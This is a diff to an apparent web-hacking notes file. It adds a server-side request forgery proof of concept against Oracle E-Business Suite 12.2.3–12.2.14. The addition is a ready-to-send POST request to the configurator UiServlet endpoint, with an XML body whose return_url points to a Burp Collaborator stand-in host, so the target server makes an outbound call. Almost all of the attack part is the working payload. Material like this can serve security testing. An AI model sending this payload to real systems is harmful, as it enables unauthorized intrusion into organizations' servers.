@@ -399,7 +399,23 @@ Connection: close
 ```
 ![ssrf-3](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/c3486635-b964-49c8-8882-300a75e0931b)
 
-
+# Oracle E-Business Suite (12.2.3-12.2.14) SSRF POC
+```html
+Method: POST
+Path: /OA_HTML/configurator/UiServlet
+Parameter: return_url
+------
+Body:
+------
+redirectFromJsp=1&getUiType=<?xml version="1.0" encoding="UTF-8"?>
+        <initialize>
+          <param name="init_was_saved">anything</param>
+          <param name="return_url">http://BURP_COLLABORATOR</param>
+          <param name="ui_def_id">0</param>
+          <param name="config_effective_usage_id">0</param>
+          <param name="ui_type">Applet</param>
+        </initialize>
+```
 
 # SSRF at a glance
 [SSRF (Server-Side Request Forgery ).pdf](https://github.com/Mehdi0x90/Web_Hacking/files/12438160/SSRF.Server-Side.Request.Forgery.pdf)
